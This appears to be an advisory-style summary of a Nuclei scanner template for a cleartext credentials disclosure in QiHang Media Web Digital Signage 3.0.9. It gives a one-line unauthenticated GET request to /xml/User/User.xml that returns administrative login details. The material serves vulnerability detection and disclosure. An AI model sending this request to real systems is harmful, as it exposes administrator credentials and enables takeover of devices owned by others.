# Nuclei Template: QiHang Media Web Digital Signage 3.0.9 - Cleartext Credentials Disclosure
**Template ID:** qihang-media-disclosure
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`qihang-media-disclosure.yaml`)

## Vulnerability Information & PoC

## Description
QiHang Media Web Digital Signage 3.0.9 suffers from a clear-text credentials disclosure vulnerability that allows an unauthenticated attacker to issue a request to an unprotected directory that hosts an XML file /xml/User/User.xml and obtain administrative login information that allows for a successful authentication bypass attack.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/xml/User/User.xml
```

## References
- https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5579.php
